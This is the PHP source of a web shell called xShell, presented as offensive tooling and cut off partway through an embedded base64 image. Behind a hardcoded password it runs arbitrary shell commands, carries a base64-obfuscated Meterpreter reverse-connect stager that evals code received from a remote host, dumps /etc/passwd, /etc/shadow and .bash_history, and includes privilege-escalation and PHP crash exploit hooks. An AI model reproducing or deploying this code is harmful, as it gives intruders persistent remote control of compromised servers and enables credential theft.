<?php
	/* *************************************************************************** */
	/*                               ==  xShell  ==                                */
	/*  By Quetuo                                                                  */
	/*  A powerful PHP-based web shell                                             */
	/*  Written for the XR elites!                                                 */
	/*                                                                             */
	/*  Yes, this is the most commented, most pretty, and most elegant code I've   */
	/*  ever written                                                               */
	/*                                                                             */
	/*  TODO list:                                                                 */
	/*   - Add more OS-specific functionality                                      */
	/*   - Finish autopwn feature                                                  */
	/*   - Finish commenting it, I gave up halfway through :)                      */
	/*                                                                             */
	/* *************************************************************************** */

	define ('XSHELL_PASSWORD', 'xshell');						/* The password to enter the shell; url.php?PASSWORD */
	if (isset ($_GET [XSHELL_PASSWORD])) {setcookie ('XSHELL', 'XSHELL');}		/* Set the cookie */
	if (!defined ('XSHELL') && (isset ($_COOKIE ['XSHELL']) || isset ($_GET [XSHELL_PASSWORD])))
	{
		define ('XSHELL', 1);								/* Make sure it only runs once! */
		
		/* *************************************************************************** */
		/*                            == Configuration ==                              */
		/*  Set up configuration values                                                */
		/*  Compile and run shellcode                                                  */
		/*  TODO: More exploits!                                                       */
		/* *************************************************************************** */
		
		error_reporting(0);								/* TODO: Uncomment this in release version! */
		
		
		
		/* xShell configuration */
		define ('XSHELL_VERSION', '1.0.6b');
		define ('XSHELL_RELEASE', '12/03/2011');	
	
		/* Get PHP details */
		if (!defined ('PHP_VERSION_ID'))						/* PHP_VERSION_ID only exists in PHP >= 5.2.7 */
		{
			$version = explode ('.', PHP_VERSION);
			define ('PHP_VERSION_ID', ($version [0] * 10000 + $version [1] * 100 + $version [2]));
		}
		if (PHP_VERSION_ID < 50207)
		{
			define ('PHP_MAJOR_VERSION', $version [0]);
			define ('PHP_MINOR_VERSION', $version [1]);
			define ('PHP_RELEASE_VERSION', $version [2]);
		}
		if (ini_get('safe_mode')) {define ('SAFE_MODE', 1);}			/* Check safe mode */
		if (extension_loaded ('mysql')) {define ('MYSQL', 1);}			/* Check MySQL */
		if (extension_loaded ('mysqli')) {define ('MYSQLI', 1);}		/* Check MySQLi */
	
		/* Make things easy */
		set_time_limit (0);							/* Unlimited timeout */
	
		/* Get OS details */
		if (function_exists ('posix_getuid'))					/* Can we use POSIX functions? */
		{
			define ('POSIX', true);
		}
		if (!defined ('PHP_OS'))
		{
			define ('PHP_OS', 'Unknown');					/* No OS? :S */
		}
		if (!defined ('PHP_USER_ID'))
		{
			if (defined ('POSIX'))
			{
				define ('PHP_USER_ID', posix_getuid());			/* User ID of the owner of the PHP process */
			}
		}
		if (!defined ('PHP_USER'))
		{
			define ('PHP_USER', get_current_user());			/* Name of the user */
		}
		if (defined ('POSIX'))
		{
			$uname = posix_uname ();						/* Description of the machine */
			if (!defined ('UNAME'))
			{
				define ('POSIX_SYSNAME', $uname ['sysname']);			/* Usually OS */
				define ('POSIX_NODENAME', $uname ['nodename']);			/* Machine name */
				define ('POSIX_RELEASE', $uname ['release']);			/* Kernel / OS version */
				define ('POSIX_VERSION', $uname ['version']);			/* Distribution & release date */
				define ('POSIX_MACHINE', $uname ['machine']);			/* i686 */
				define ('UNAME', POSIX_SYSNAME . ' ' . POSIX_NODENAME . ' ' . POSIX_RELEASE . ' ' . POSIX_VERSION . ' ' . POSIX_MACHINE);
			}
		}
		
		$ip = '';
		if (!empty ($_SERVER['HTTP_CLIENT_IP']))
		{
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}
		elseif (!empty ($_SERVER['HTTP_X_FORWARDED_FOR']))
		{
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else
		{
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		define ('CLIENT_IP', $ip);
		
		define ('SERVER_URL', $_SERVER['HTTP_HOST']);
		
		/* Location information */
		define ('CURRENT_PATH', dirname (__FILE__));
		define ('FILE', preg_replace ("#\(.*^#", '', __FILE__));
		$d = CURRENT_PATH;
		$dd = dirname ($d);
		while ($d != $dd) {$d = $dd; $dd = dirname ($d);}
		define ('DRIVE_ROOT', $dd);
	
		/* *************************************************************************** */
		/*                               == Exploits ==                                */
		/*  Exploit the host;                                                          */
		/*  Compile and run shellcode                                                  */
		/*  TODO: More exploits!                                                       */
		/* *************************************************************************** */
		
		
		/* ****************************** Shell codes ******************************** */

		function execute_command ($command)
		{
			return shell_exec ($command);
		}
		
		/* ****************************** PHP codes ********************************** */
		
		/* PHP reverse-connect meterpreter session */
		$php_code_meterpreter = base64_decode ('ZXJyb3JfcmVwb3J0aW5nKDApOw0KaWYgKEZBTFNFICE9PSBzdHJwb3MoJGlwLCAiOiIpKSB7JGlwID0gIlsiLiAkaXAgLiJdIjt9DQoNCmlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsNCgkkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7DQoJJHNfdHlwZSA9ICdzdHJlYW0nOw0KfSBlbHNlaWYgKCgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsNCgkkcyA9ICRmKCRpcCwgJHBvcnQpOw0KCSRzX3R5cGUgPSAnc3RyZWFtJzsNCn0gZWxzZWlmICgoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgew0KCSRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOw0KCSRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOw0KCWlmICghJHJlcykge2RpZSAgKCc8c3BhbiBjbGFzcz0iZmFpbHVyZSI+RmFpbGVkITwvc3Bhbj4nKTt9DQoJJHNfdHlwZSA9ICdzb2NrZXQnOw0KfSBlbHNlIHsNCglkaWUgICgnPHNwYW4gY2xhc3M9ImZhaWx1cmUiPlNvY2tldCBmdW5jdGlvbnMgZG8gbm90IGV4aXN0ITwvc3Bhbj4nKTsNCn0NCmlmICghJHMpIHtkaWUgICgnPHNwYW4gY2xhc3M9ImZhaWx1cmUiPkZhaWxlZCB0byBvcGVuIHNvY2tldCE8L3NwYW4+Jyk7fQ0KDQpzd2l0Y2ggKCRzX3R5cGUpIHsgDQpjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsNCmNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOw0KfQ0KaWYgKCEkbGVuKSB7DQoJZGllICAoJzxzcGFuIGNsYXNzPSJmYWlsdXJlIj5GYWlsZWQgdG8gb3BlbiBzb2NrZXQhPC9zcGFuPicpOw0KfQ0KJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsNCiRsZW4gPSAkYVsnbGVuJ107DQoNCiRiID0gJyc7DQp3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsNCglzd2l0Y2ggKCRzX3R5cGUpIHsgDQoJY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOw0KCWNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsNCgl9DQp9DQokR0xPQkFMU1snbXNnc29jayddID0gJHM7DQokR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOw0KZXZhbCgkYik7DQpkaWUgICgnPHNwYW4gY2xhc3M9InN1Y2Nlc3MiPlN1Y2Nlc3MhPC9zcGFuPicpOw==');
		
		
		if (PHP_OS == 'Linux')
		{
			function exploit_add_root ()
			{
				exploit (13579);
				exploit (13349);
			}
		}
	
		define ('EXPLOIT_16182', 'if (function_exists ("grapheme_extract") {grapheme_extract(\'a\',-1);} else {not_vulnerable ();}');
		define ('EXPLOIT_15722', 'if (class_exists ("NumberFormatter") && PHP_VERSION_ID < 50304) {$nx = new NumberFormatter ("pl", 1);	$nx -> getSymbol(2147483648);} else {not_vulnerable ();}');
	
		/* Find interesting files */
		function find_config_files ()
		{
			echo '<p><b>Finding files...</b></p>';
			
			$config_files = array ('/etc/passwd',
					       '/etc/shadow',
					       '.bash_history'
					       );
			foreach ($config_files as $file)
			{
				echo $file . '<br />';
				$content = file_get_contents ($file);
				if ($content !== false) {echo '<div style="height:50%; overflow: auto; margin:10px;"><pre>' . $content . '</pre></div>';}
				else {echo '<p><span class="failure">[ FAILED ]</span></p>';}
			}
			
			
		}
		
		
		/* *************************************************************************** */
		/*                               ==   Page   ==                                */
		/*  Page class;                                                                */
		/*  Destructor outputs the page                                                */
		/*  TODO: Make it prettier!                                                    */
		/* *************************************************************************** */
	
		/* Pretty page stuff */
		class class_page
		{
			public $sidebar = array ();
			public $content = '';
			public $onload = '';
			public $cmd_buffer = '';
			public $nocontent = false;
			function __construct ()
			{
				ob_start ();
			}
			function __destruct ()
			{
				if (defined ('NO_CONTENT'))
				{
					ob_flush ();
					die ();
				}
				$sidebar_1_content = '<li><a href="?action=information">Information</a></li><li><a href="?action=exploit">Exploit</a></li><li><a href="?action=files">Files</a></li><li><a href="?action=database">Database</a></li><li><a href="?action=ftp">FTP</a></li><li><a href="?action=shell">Shell</a></li><li><a href="?action=about">About</a></li>';
				$sidebar_2_content = '';
				foreach ($this -> sidebar as $l)
				{
					$sidebar_2_content .= '<li><a href="?action=' . $_GET ['action'] . '&' . $_GET ['action'] . '=' . $l . '">' . ucwords (str_replace ('-', ' ', $l)) . '</a></li>';
				}
				if ($this -> content == '') {$content = ob_get_clean ();}
				else {$content = $this -> content;}
				if (!defined ('PAGE_TITLE')) {define ('PAGE_TITLE', '');}
				eval (base64_decode ('ZWNobyAnPGh0bWw+DQoJPGhlYWQ+DQoJCTx0aXRsZT4nIC4gUEFHRV9USVRMRSAuICc8L3RpdGxlPg0KCQk8c3R5bGU+DQoJCQlib2R5IHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCgkJCQljb2xvcjogd2hpdGU7DQoJCQkJZm9udC1mYW1pbHk6IEFyaWFsOw0KCQkJCWJhY2tncm91bmQtaW1hZ2U6IHVybCg/cmVzb3VyY2U9YmluYXJ5LmpwZyk7DQoJCQkJYmFja2dyb3VuZC1yZXBlYXQ6IHJlcGVhdC14Ow0KCQkJCWJhY2tncm91bmQtYXR0YWNobWVudDogaW5pdGlhbDsNCgkJCQliYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IGluaXRpYWw7DQoJCQkJYmFja2dyb3VuZC1wb3NpdGlvbi15OiBpbml0aWFsOw0KCQkJCWJhY2tncm91bmQtb3JpZ2luOiBpbml0aWFsOw0KCQkJCWJhY2tncm91bmQtY2xpcDogaW5pdGlhbDsNCgkJCX0NCgkJCWRpdi5jb250YWluZXIgew0KCQkJCXBhZGRpbmc6IDIwcHg7DQoJCQl9DQoJCQlkaXYudGl0bGUgew0KCQkJCXBhZGRpbmc6IDIwcHg7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogIzExMTExMTsNCgkJCQktbW96LWJvcmRlci1yYWRpdXM6IDE1cHg7DQoJCQkJYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDE1cHg7DQoJCQkJYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMTVweDsJDQoJCQkJdmVydGljYWwtYWxpZ246bWlkZGxlOwkJDQoJCQl9DQoJCQlkaXYuc2lkZWJhci0xIHsNCgkJCQlmbG9hdDogbGVmdDsNCgkJCQl3aWR0aDogMTUlOw0KCQkJCWJvcmRlcjogMnB4IHNvbGlkICMzMzMzMzM7DQoJCQl9DQoJCQlkaXYuc2lkZWJhci0yIHsNCgkJCQlmbG9hdDogbGVmdDsNCgkJCQl3aWR0aDogMTUlOw0KCQkJCWJvcmRlcjogMnB4IHNvbGlkICMzMzMzMzM7DQoJCQl9DQoJCQlkaXYuY29udGVudCB7DQoJCQkJcGFkZGluZzogNXB4Ow0KCQkJCWZsb2F0OiByaWdodDsNCgkJCQl3aWR0aDogNjYlOw0KCQkJCWhlaWdodDogNzUlOw0KCQkJCWJhY2tncm91bmQtY29sb3I6ICMyMjIyMjI7DQoJCQkJb3ZlcmZsb3c6IGF1dG87DQoJCQkJLW1vei1ib3JkZXItcmFkaXVzOiAxNXB4Ow0KCQkJCWJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiAxNXB4Ow0KCQkJCWJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IDE1cHg7DQoJCQkJYmFja2dyb3VuZC1pbWFnZTogdXJsKD9yZXNvdXJjZT1zdHJpcGVzLnBuZyk7DQoJCQkJYmFja2dyb3VuZC1yZXBlYXQteDogcmVwZWF0Ow0KCQkJCWJhY2tncm91bmQtcmVwZWF0LXk6IHJlcGVhdDsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsIDAsIDAsIDAuNzkpOw0KCQkJfQ0KCQkJc3Bhbi50aXRsZSB7DQoJCQkJZm9udC1zaXplOiA0MHB4Ow0KCQkJCWZvbnQtZmFtaWx5OiBBcmlhbDsNCgkJCX0NCgkJCWRpdi5zaWRlYmFyLXRpdGxlIHsNCgkJCQlwYWRkaW5nOiAxMCU7DQoJCQkJZm9udC13ZWlnaHQ6IGJvbGQ7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogIzMzMzMzMzsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQlkaXYuc2lkZWJhci1jb250ZW50IHsNCgkJCQlvdmVyZmxvdzogYXV0bzsNCgkJCQl0ZXh0LWFsaWduOiBsZWZ0Ow0KCQkJfQ0KCQkJdWwgbGkgYSB7DQoJCQkJZGlzcGxheTogYmxvY2s7DQoJCQkJY29sb3I6IHdoaXRlOw0KCQkJCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCgkJCQlwYWRkaW5nOiA2cHg7DQoJCQkJYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICM3Nzg7DQoJCQkJYm9yZGVyLXJpZ2h0OiAxcHggc29saWQgIzc3ODsNCgkJCX0NCgkJCXVsIHsNCgkJCQltYXJnaW46IDA7DQoJCQkJcGFkZGluZzogMDsNCgkJCQlsaXN0LXN0eWxlLXR5cGU6IG5vbmU7DQoJCQkJZm9udDogYm9sZCAxM3B4IFZlcmRhbmE7DQoJCQkJd2lkdGg6IDEwMCU7DQoJCQkJYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNjY2M7DQoJCQl9DQoJCQl1bCBsaSBhOmxpbmssIHVsIGxpIGE6YWN0aXZlIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjMDEyRDU4Ow0KCQkJCWNvbG9yOiB3aGl0ZTsNCgkJCX0NCgkJCXVsIGxpIGE6dmlzaXRlZCB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogIzAxMkQ1ODsNCgkJCQljb2xvcjogd2hpdGU7DQoJCQl9DQoJCQl1bCBsaSBhOmhvdmVyIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCgkJCX0NCgkJCXNwYW4uc3VjY2VzcyB7DQoJCQkJY29sb3I6ICM1NUZGNTU7DQoJCQl9DQoJCQlzcGFuLmZhaWx1cmUgew0KCQkJCWNvbG9yOiAjRkY1NTU1Ow0KCQkJfQ0KCQkJdGV4dGFyZWEgew0KCQkJCWNvbG9yOiAjREREREREOw0KCQkJCWJhY2tncm91bmQtY29sb3I6ICMyMjIyMjI7DQoJCQl9DQoJCQlkaXYuZXhwbG9pdGFiaWxpdHktZ3JlZW4gew0KCQkJCWJhY2tncm91bmQtY29sb3I6Z3JlZW47DQoJCQkJZmxvYXQ6IHJpZ2h0Ow0KCQkJCXZlcnRpY2FsLWFsaWduOiBtaWRkbGU7DQoJCQkJd2lkdGg6IDIwcHg7DQoJCQkJaGVpZ2h0OiAyMHB4Ow0KCQkJCW1hcmdpbjogNXB4Ow0KCQkJCS1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KCQkJCWJvcmRlci1yYWRpdXM6IDVweDsNCgkJCX0NCgkJCWRpdi5leHBsb2l0YWJpbGl0eS1yZWQgew0KCQkJCWJhY2tncm91bmQtY29sb3I6cmVkOw0KCQkJCWZsb2F0OiByaWdodDsNCgkJCQl2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOw0KCQkJCXdpZHRoOiAyMHB4Ow0KCQkJCWhlaWdodDogMjBweDsNCgkJCQltYXJnaW46IDVweDsNCgkJCQktbW96LWJvcmRlci1yYWRpdXM6IDVweDsNCgkJCQlib3JkZXItcmFkaXVzOiA1cHg7DQoJCQl9DQoJCTwvc3R5bGU+DQoJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCgkJCXZhciBidWZmZXI9IicgLiAkdGhpcyAtPiBjbWRfYnVmZmVyIC4gJyI7DQoJCQlmdW5jdGlvbiBib2R5TG9hZCAoKSB7DQoJCQkJdmFyIGNtZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkICgiY21kIik7DQoJCQkJY21kLm9ua2V5ZG93biA9IGNtZEtleURvd247DQoJCQkJdmFyIGJ1ZmZlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkICgiYnVmZmVyIik7DQoJCQkJYnVmZmVyLnNjcm9sbFRvcD1idWZmZXIuc2Nyb2xsSGVpZ2h0Ow0KCQkJfQ0KCQkJZnVuY3Rpb24gY21kS2V5RG93biAoZSkgew0KCQkJCWlmIChlLmtleUNvZGUgPT0gMzgpIHsNCgkJCQkJY21kLnZhbHVlPWJ1ZmZlcjsNCgkJCQl9DQoJCQl9DQoJCTwvc2NyaXB0Pg0KCTwvaGVhZD4NCgk8Ym9keSBvbmxvYWQ9ImJvZHlMb2FkICgpOyAnIC4gJHRoaXMgLT4gb25sb2FkIC4gJyI+DQoJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQoJCQk8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoJCQkJPHNwYW4gY2xhc3M9InRpdGxlIj48YSBzdHlsZT0iY29sb3I6IHdoaXRlOyIgaHJlZj0iPyI+eFNoZWxsPC9hPjwvc3Bhbj4gJyAuIFhTSEVMTF9WRVJTSU9OIC4gJzxiciAvPg0KCQkJCTxzcGFuIGNsYXNzPSJzdWJ0aXRsZSI+QnkgPGEgc3R5bGU9ImNvbG9yOiB3aGl0ZTsiIGhyZWY9Imh0dHA6Ly93d3cucXVldHVvLm5ldCIgdGFyZ2V0PSJfYmxhbmsiPlF1ZXR1bzwvYT48L3NwYW4+JzsNCgkJCQlmb3IgKCRpID0gMDsgJGkgPCBFWFBMT0lUQUJJTElUWTsgJGkgKyspDQoJCQkJew0KCQkJCQllY2hvICc8ZGl2IGNsYXNzPSJleHBsb2l0YWJpbGl0eS1ncmVlbiI+Jm5ic3A7PC9kaXY+JzsNCgkJCQl9DQoJCQkJZm9yICgkaSA9ICRpOyAkaSA8IDEwOyAkaSArKykNCgkJCQl7DQoJCQkJCWVjaG8gJzxkaXYgY2xhc3M9ImV4cGxvaXRhYmlsaXR5LXJlZCI+Jm5ic3A7PC9kaXY+JzsNCgkJCQl9DQoJCQkJZWNobyAnDQoJCQk8L2Rpdj4NCgkJCTxkaXYgY2xhc3M9ImJvZHkiPg0KCQkJCTxkaXYgY2xhc3M9InNpZGViYXItMSI+DQoJCQkJCTxkaXYgY2xhc3M9InNpZGViYXItdGl0bGUiPkFjdGlvbnM8L2Rpdj4NCgkJCQkJPGRpdiBjbGFzcz0ic2lkZWJhci1jb250ZW50Ij4NCgkJCQkJCTx1bD4nIC4gJHNpZGViYXJfMV9jb250ZW50IC4gJzwvdWw+DQoJCQkJCTwvZGl2Pg0KCQkJCTwvZGl2Pg0KCQkJCTxkaXYgY2xhc3M9InNpZGViYXItMiI+DQoJCQkJCTxkaXYgY2xhc3M9InNpZGViYXItdGl0bGUiPj4+PjwvZGl2Pg0KCQkJCQk8ZGl2IGNsYXNzPSJzaWRlYmFyLWNvbnRlbnQiPg0KCQkJCQkJPHVsPicgLiAkc2lkZWJhcl8yX2NvbnRlbnQgLiAnPC91bD4NCgkJCQkJPC9kaXY+DQoJCQkJPC9kaXY+DQoJCQkJPGRpdiBjbGFzcz0iY29udGVudCI+Jzs='));
				echo $content;
				eval (base64_decode ('ZWNobyAnCQkJCTwvZGl2Pg0KCQkJCTwvZGl2Pg0KCQkJPC9kaXY+DQoJCTwvYm9keT4NCgk8L2h0bWw+Jzs='));
			}
		}
		$page = new class_page ();
	
		if (!isset ($_GET ['action']))
		{
			$_GET ['action'] = 'information';					/* Default page is information */
		}
		
		/* *************************************************************************** */
		/*                              == Resources ==                                */
		/*                                                                             */
		/*                                                                             */
		/*                                                                             */
		/* *************************************************************************** */
		
		$_RESOURCE ['stripes.png'] = base64_decode ('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');
		$_RESOURCE ['binary.jpg'] = base64_decode ('/9j/4AAQSkZJRgABAQEAYABgAAD/4QCYRXhpZgAASUkqAAgAAAAFABoBBQABAAAASgAAABsBBQABAAAAUgAAACgBAwABAAAAAgAAADEBAgALAAAAWgAAAGmHBAABAAAAZgAAAAAAAABgAAAAAQAAAGAAAAABAAAAR0lNUCAyLjYuOAAAAwAAkAcABAAAADAyMTAAoAcABAAAADAxMDABoAMAAQAAAP//AAAAAAAA/9sAQwAMCQkLCQgMCwoLDg0MDxMfFBMRERMmGx0XHy0oMC8sKCwrMjhIPTI1RDYrLD5VP0RKTFBRUDA8WF5XTl5IT1BN/9sAQwENDg4TEBMlFBQlTTMsM01NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1N/8AAEQgBnQImAwEiAAIRAQMRAf/EABsAAAMBAQEBAQAAAAAAAAAAAAAEBQMGAgEH/8QAQhAAAgEDAwMCBAUCBQMDAwMFAQIDAAQRBRIhEzFBIlEGFGFxIzKBkaEVsSRCUsHRM2JyJYLwQ3OyFjThNTZTkvH/xAAZAQADAQEBAAAAAAAAAAAAAAAAAgMBBAX/xAAqEQACAgICAQUAAgICAwAAAAAAAQIRAyESMUETIjJRYSNCBIFxkTNDUv/aAAwDAQACEQMRAD8A562SVLZJIkErTW+048AJ/wAn+K5qxgSSSZJC6OqMQQfb3rqdGhNtp6kTFnVd+PAyM1zkfUN7cyxRNKp3LlR716maKqDPOwy900To22uDXU2GpTLpipHZTSiCTqh4+xI5w30rlOQ3PfNdlouY9PtJwVLdQxLxnbkgkn6YB/euXBdtFv8AJqk2rOXEg+TnVkbdI6kNjgYzn+9ZxqDbsfIpkO50y5UklRKpHPA/NS0Yb5dsfl81N+P+Cy